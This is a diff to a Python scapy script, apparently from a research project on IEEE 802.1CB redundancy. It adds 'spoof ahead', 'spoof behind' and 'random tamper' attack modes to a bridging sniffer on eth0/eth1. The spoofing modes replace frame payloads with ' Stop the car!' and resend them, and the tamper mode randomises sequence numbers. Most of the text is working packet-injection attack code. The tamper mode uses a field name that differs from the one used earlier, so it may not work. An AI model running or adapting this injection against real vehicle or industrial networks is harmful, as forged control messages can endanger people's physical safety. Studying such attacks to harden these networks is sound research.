@@ -3,14 +3,17 @@
 # More: https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
 # More: https://scapy.readthedocs.io/en/latest/build_dissect.html
 # Page 49 of the IEEE 802.1CB standard
-
+import random
 import time
 import sys
 
 from scapy.packet import Raw
 
 from RedundancyTag import RedundancyTag
-from scapy.sendrecv import bridge_and_sniff
+from scapy.sendrecv import bridge_and_sniff, sendp
+
+input_interface = "eth0"
+output_interface = "eth1"
 
 
 def determine_attack():
@@ -27,11 +30,14 @@ def determine_attack():
         print("No attack number provided. Defaulting to passive mode.")
 
     if attack == 1:
-        """The attacker uses spoofing to create new packets within
-        the network with existing sequence numbers that arrive
-        earlier than the correct packets."""
-        print("Stay ahead spoofing is enabled.")
-        return stay_ahead
+        print("Spoof Ahead is enabled.")
+        return spoof_ahead
+    elif attack == 2:
+        print("Spoof Behind is enabled.")
+        return spoof_behind
+    elif attack == 3:
+        print("Tamper Random is enabled.")
+        return tamper_random
     else:
         print("Passive mode is enabled.")
         return passive
@@ -45,15 +51,41 @@ def passive(pkt):
     return pkt.haslayer(RedundancyTag)
 
 
-def stay_ahead(pkt):
+def spoof_ahead(pkt):
     """
-    This function modifies packets by increasing the sequence
-    number by 1, and changing the payload.
+    Use spoofing to create new packets within the network with existing
+    sequence numbers that arrive earlier than the correct packets.
     """
+    global output_interface
     if pkt.haslayer(RedundancyTag):
-        pkt[RedundancyTag].SequenceNumber += 1
         debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
         pkt[Raw].load = debug_number + " Stop the car!"
+        sendp(pkt, iface=output_interface)
+        return True
+    else:
+        return False
+
+
+def spoof_behind(pkt):
+    """
+    Use spoofing to create new packets within the network with existing
+    sequence numbers that arrive later than the correct packets.
+    """
+    global output_interface
+    if pkt.haslayer(RedundancyTag):
+        sendp(pkt, iface=output_interface)
+        debug_number = pkt[Raw].load.decode("utf-8").split(' ')[0]
+        pkt[Raw].load = debug_number + " Stop the car!"
+        return pkt
+    else:
+        return False
+
+
+def tamper_random(pkt):
+    """Modifies existing packets to have random sequence numbers."""
+    if pkt.haslayer(RedundancyTag):
+        random_sequence_number = random.randint(0, 65535)
+        pkt[RedundancyTag].sequence_number = random_sequence_number
         return pkt
     else:
         return False
